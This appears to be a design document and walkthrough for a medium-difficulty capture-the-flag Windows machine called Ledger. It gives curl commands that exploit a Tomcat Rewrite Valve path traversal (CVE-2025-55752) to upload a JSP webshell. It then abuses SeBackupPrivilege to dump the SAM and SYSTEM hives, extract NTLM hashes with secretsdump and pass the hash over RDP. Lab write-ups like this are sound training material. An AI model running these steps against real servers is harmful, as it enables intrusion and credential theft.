# CTF Machine: Ledger

## Overview

**Name:** Ledger
**Difficulty:** Medium
**OS:** Windows Server 2025 Standard
**Domain:** `ledger.ms`
**Theme:** Small accounting firm's self-hosted invoice management portal on Apache Tomcat

**Story:** A small accounting firm runs a custom Java invoice management webapp on Apache Tomcat 10.1.44. The IT consultant enabled the Rewrite Valve for pretty URLs and set `readonly="false"` on the default servlet for a staff upload feature. Tomcat was never patched past 10.1.44, leaving CVE-2025-55752 exploitable. The `svc_tomcat` service account was granted SeBackupPrivilege for invoice file-access convenience without understanding the security implications.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Web | Apache Tomcat 10.1.44 with TLS (port 443, self-signed cert) |
| Application | Custom Java invoice webapp (WAR deployment) |
| Rewrite Valve | Enabled in `server.xml` — rewrites `/invoices/<id>` to `/app/invoice.jsp?id=<id>` |
| Default Servlet | `readonly="false"` (PUT enabled) |
| Open Ports | 443 (HTTPS — Tomcat), 3389 (RDP) |
| App runs as | `svc_tomcat` (SeBackupPrivilege) |

---

## Attack Chain

### 1 → Enumeration — Anonymous → Reconnaissance

Nmap discovers 443 (Tomcat) and 3389 (RDP). Tomcat 10.1.44 disclosed in error pages and `Server` header. `OPTIONS` reveals PUT is allowed. Web fuzzing finds `/invoices/`, `/app/`, `/manager/` (403).

- `nmap -sC -sV -p- ledger.ms` → 443 (Tomcat 10.1.44), 3389 (RDP)
- `curl -sk -X OPTIONS https://ledger.ms/ -v` → PUT allowed
- Key discovery: Tomcat 10.1.44 + PUT + Rewrite Valve = CVE-2025-55752

---

### 2 → CVE-2025-55752 Path Traversal + PUT — Anonymous → svc_tomcat

Path traversal in Tomcat's Rewrite Valve: rewritten URL is normalized before decoding, allowing bypass of `/WEB-INF/` and `/META-INF/` protections. Combined with PUT, upload a JSP webshell.

**Exploitation:**
```bash
curl -sk -X PUT "https://ledger.ms/%252e%252e/shell.jsp" --data-binary @webshell.jsp
curl -sk "https://ledger.ms/shell.jsp?cmd=whoami"
# Output: ledger\svc_tomcat
```

**CVE:** CVE-2025-55752 — Relative Path Traversal in Apache Tomcat Rewrite Valve (CWE-23, CVSS 7.5)

🚩 **user.txt** → `C:\Users\svc_tomcat\Desktop\user.txt`

---

### 3 → SeBackupPrivilege → SAM Dump → Administrator — svc_tomcat → Administrator

`whoami /priv` reveals SeBackupPrivilege. Dump SAM and SYSTEM registry hives, extract NTLM hashes, pass-the-hash.

**Exploitation:**
```bash
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM

# On attacker machine:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
xfreerdp /v:ledger.ms /u:Administrator /pth:<NTLM_HASH> /cert:ignore
```

**Why it works:** SeBackupPrivilege allows reading any file regardless of ACLs, including SAM/SYSTEM hives containing NTLM hashes.

🚩 **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

---

## Rabbit Holes

### Rabbit Hole 1: Tomcat Manager Interface
**What the solver finds:** `/manager/` returns 403 Forbidden.
**Why it looks promising:** Tomcat Manager with default creds is a classic vector.
**Why it's a dead end:** Access restricted by `RemoteAddrValve` to `127.0.0.1` only. No default creds work.
**What it teaches:** Not every Tomcat deployment has an accessible Manager. Look for version-specific CVEs instead.

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | `C:\Users\svc_tomcat\Desktop\user.txt` | svc_tomcat |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` | Administrator / SYSTEM |

---

## Full Chain Diagram

```
Anonymous
    │  nmap → port 443 (Tomcat 10.1.44), 3389 (RDP)
    │  Web enumeration → Rewrite Valve active, PUT enabled
    │  CVE-2025-55752 → path traversal + PUT JSP webshell
    ▼
svc_tomcat  →  user.txt
    │  whoami /priv → SeBackupPrivilege
    │  reg save SAM + SYSTEM → secretsdump → Admin NTLM hash
    │  Pass-the-hash → RDP as Administrator
    ▼
Administrator  →  root.txt
```
